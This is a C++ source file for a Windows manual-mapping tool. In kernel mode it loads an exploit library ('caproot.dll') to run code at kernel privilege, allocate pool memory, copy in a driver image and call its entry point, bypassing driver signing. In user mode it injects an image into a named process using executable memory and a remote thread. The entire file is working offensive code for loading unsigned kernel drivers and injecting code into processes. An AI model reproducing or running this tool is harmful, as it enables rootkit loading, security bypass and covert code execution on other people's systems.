#include "pch.h"
#include <cstdio>
#include <memory>
#include <sstream>
#include <shellapi.h>
#include "mapper.h"
#include "utils.h"

#pragma comment(lib, "ntdll.lib") // to get RtlInitUnicodeString

using func_MmGetSystemRoutineAddressFunc = PVOID(NTAPI*)(PUNICODE_STRING);
using func_root_func = VOID(NTAPI*)(func_MmGetSystemRoutineAddressFunc);
using func_exploit = bool(NTAPI*)(func_root_func);

bool parse_cmdline(bool& is_kernel, std::wstring& image_path, std::wstring& proc_name);
bool kernel_map(const std::wstring& image_path);
bool user_map(const std::wstring& image_path, const std::wstring& proc_name);

int main() {
    bool is_kernel = false;
    std::wstring image_path;
    std::wstring proc_name;
    if (!parse_cmdline(is_kernel, image_path, proc_name)) {
        printf("[-] invalid parameters. usage:\n");
        printf("    mapper.exe -kernel -image <image path>\n");
        printf("    mapper.exe -image <image path> -proc_name <proc name>\n");
        return 1;
    }

    bool rst = false;
    if (is_kernel)
        rst = kernel_map(image_path);
    else
        rst = user_map(image_path, proc_name);

    return rst ? 0 : 1;
}

bool parse_cmdline(bool& is_kernel, std::wstring& image_path, std::wstring& proc_name) {
    is_kernel = false;
    image_path.clear();
    proc_name.clear();

    auto cmdline = GetCommandLineW();
    int num_args;
    auto args = CommandLineToArgvW(cmdline, &num_args);
    if (!args) {
        printf("[-] error parsing cmd line\n");
        return false;
    }
    std::vector<std::wstring> arg_strs;
    for (int i = 0; i < num_args; ++i) {
        std::wstring arg_str = args[i];
        arg_strs.push_back(arg_str);
    }

    if (std::find(arg_strs.begin(), arg_strs.end(), L"-kernel") != arg_strs.end())
        is_kernel = true;

    auto image_path_arg = std::find(arg_strs.begin(), arg_strs.end(), L"-image");
    if (image_path_arg == arg_strs.end() || image_path_arg + 1 == arg_strs.end())
        return false;
    image_path = *(image_path_arg + 1);

    auto proc_name_arg = std::find(arg_strs.begin(), arg_strs.end(), L"-proc_name");
    if (!is_kernel && proc_name_arg != arg_strs.end() && proc_name_arg + 1 != arg_strs.end())
        proc_name = *(proc_name_arg + 1);

    return true;
}

bool kernel_map(const std::wstring& image_path) {
    using func_MmGetSystemRoutineAddressFunc = PVOID(NTAPI*)(PUNICODE_STRING);
    using func_root_func = std::function<VOID(func_MmGetSystemRoutineAddressFunc)>;
    using func_exploit = bool(NTAPI*)(func_root_func);
    using func_caproot_initialize = func_exploit(NTAPI*)();
    using func_caproot_uninitialize = bool(NTAPI*)();
    using func_ExAllocatePool = PVOID(*)(int, SIZE_T);
    using func_ExFreePool = VOID(*)(PVOID);

    // load caproot
    auto caproot = LoadLibraryW(L"caproot.dll");
    if (!caproot) {
        printf("[-] caproot load failed\n");
        return false;
    }

    // get procs
    auto caproot_init = (func_caproot_initialize)GetProcAddress(caproot, "initialize");
    auto caproot_uninit = (func_caproot_uninitialize)GetProcAddress(caproot, "uninitialize");
    if (!caproot_init || !caproot_uninit) {
        printf("[-] caproot get proc failed\n");
        return false;
    }

    // init caproot
    auto exploit = caproot_init();
    if (!exploit) {
        printf("[-] caproot init failed\n");
        return false;
    }

    // build mapper
    auto mapper = Mapper(image_path,
        // alloc
        [&](uint32_t size) {
            void* ret = nullptr;
            exploit([&size, &ret](func_MmGetSystemRoutineAddressFunc get_system_routine) {
                UNICODE_STRING func_name_uni = { 0 };
                RtlInitUnicodeString(&func_name_uni, L"ExAllocatePool");
                auto alloc_pool = (func_ExAllocatePool)get_system_routine(&func_name_uni);
                if (alloc_pool) ret = alloc_pool(0, size);
                return true;
            });
            return ret;
        },
        // copy
        [&](void* payload, void* base, uint32_t size) {
            exploit([&](func_MmGetSystemRoutineAddressFunc get_system_routine) {
                RtlCopyMemory(base, payload, size);
                return true;
            });
            return true;
        },
        // free
        [&](void* base, uint32_t size) {
            exploit([&](func_MmGetSystemRoutineAddressFunc get_system_routine) {
                UNICODE_STRING func_name_uni = { 0 };
                RtlInitUnicodeString(&func_name_uni, L"ExFreePool");
                auto free_pool = (func_ExFreePool)get_system_routine(&func_name_uni);
                if (free_pool) free_pool(base);
                return true;
            });
        },
        // get_import_by_ordinal
        [&](char* module_name, uint16_t ordinal) {
            uintptr_t ret = 0;
            auto module_base = get_module_base_kernel(module_name);
            if (!module_base) {
                printf("[-] cannot find kernel module: %s\n", module_name);
                return ret;
            }

            exploit([&](func_MmGetSystemRoutineAddressFunc get_system_routine) {
                auto dos_header = (PIMAGE_DOS_HEADER)module_base;
                if (dos_header->e_magic != IMAGE_DOS_SIGNATURE)
                    return false;
                auto nt_headers = (PIMAGE_NT_HEADERS64)(module_base + dos_header->e_lfanew);
                if (nt_headers->Signature != IMAGE_NT_SIGNATURE ||
                    nt_headers->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC)
                    return false;
                auto export_dir = (PIMAGE_EXPORT_DIRECTORY)(module_base +
                    nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
                auto at = (uint32_t*)(module_base + export_dir->AddressOfFunctions);
                auto ot = (uint16_t*)(module_base + export_dir->AddressOfNameOrdinals);
                for (ULONG i = 0; i < export_dir->NumberOfFunctions; i++) {
                    if (ot[i] == ordinal) {
                        ret = module_base + at[i];
                        break;
                    }
                }
                return true;
            });

            return ret;
        },
        // get_import_by_name
        [&](char* module_name, char* method_name) {
            uintptr_t ret = 0;
            auto module_base = get_module_base_kernel(module_name);
            if (!module_base) {
                printf("[-] cannot find kernel module: %s\n", module_name);
                return ret;
            }

            exploit([&](func_MmGetSystemRoutineAddressFunc get_system_routine) {
                auto dos_header = (PIMAGE_DOS_HEADER)module_base;
                if (dos_header->e_magic != IMAGE_DOS_SIGNATURE)
                    return false;
                auto nt_headers = (PIMAGE_NT_HEADERS64)(module_base + dos_header->e_lfanew);
                if (nt_headers->Signature != IMAGE_NT_SIGNATURE ||
                    nt_headers->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC)
                    return false;
                auto export_dir = (PIMAGE_EXPORT_DIRECTORY)(module_base +
                    nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
                auto at = (uint32_t*)(module_base + export_dir->AddressOfFunctions);
                auto ot = (uint16_t*)(module_base + export_dir->AddressOfNameOrdinals);
                auto nt = (uint32_t*)(module_base + export_dir->AddressOfNames);
                for (ULONG i = 0; i < export_dir->NumberOfFunctions; i++) {
                    auto func_name = (char*)(module_base + nt[i]);
                    if (_stricmp(method_name, func_name) == 0) {
                        ret = module_base + at[ot[i]];
                        break;
                    }
                }
                return true;
            });

            return ret;
        },
        // run
        [&](void* mapping_base, void* entry_point) {
            using func_DriverEntry = NTSTATUS(*)(PVOID, PVOID);
            auto entry = (func_DriverEntry)entry_point;
            return exploit([&](func_MmGetSystemRoutineAddressFunc get_system_routine) {
                return entry(mapping_base, nullptr) == 0;
            });
        });

    // map
    if (!mapper.map()) {
        printf("[-] map failed\n");
        return false;
    }

    // uninit caproot
    if (!caproot_uninit()) {
        printf("[-] caproot uninit failed\n");
        return false;
    }

    printf("[+] map succeeded\n");
    return true;
}

bool user_map(const std::wstring& image_path, const std::wstring& proc_name) {
    // open process
    auto process = open_process_by_name(proc_name);
    if (!process) {
        printf("[-] cannot open process\n");
        return false;
    }

    // build mapper
    auto mapper = Mapper(image_path,
        // alloc
        [&](uint32_t size) {
            return VirtualAllocEx(process, nullptr, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        },
        // copy
        [&](void* payload, void* base, uint32_t size) {
            return WriteProcessMemory(process, base, payload, size, nullptr);
        },
        // free
        [&](void* base, uint32_t size) {
            VirtualFreeEx(process, base, size, MEM_FREE);
        },
        // get_import_by_ordinal
        [&](char* module_name, uint16_t ordinal) {
            uint32_t module_size = 0;
            auto module_base = get_module_from_process(process, module_name, module_size);
            if (!module_base) return (uintptr_t)0;
            return get_export(process, module_base, module_size, ExportType::Ordinal, ordinal, nullptr);
        },
        // get_import_by_name
        [&](char* module_name, char* method_name) {
            uint32_t module_size = 0;
            auto module_base = get_module_from_process(process, module_name, module_size);
            if (!module_base) return (uintptr_t)0;
            return get_export(process, module_base, module_size, ExportType::Name, 0, method_name);
        },
        // run
        [&](void* mapping_base, void* entry_point) {
            auto thread = CreateRemoteThread(process, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(entry_point), nullptr, 0, nullptr);
            if (thread) {
                CloseHandle(thread);
                return true;
            }
            return false;
        });

    // map
    auto rst = mapper.map();
    if (!rst) printf("[-] map failed\n");
    else printf("[+] map succeeded\n");
    CloseHandle(process);

    return rst;
}
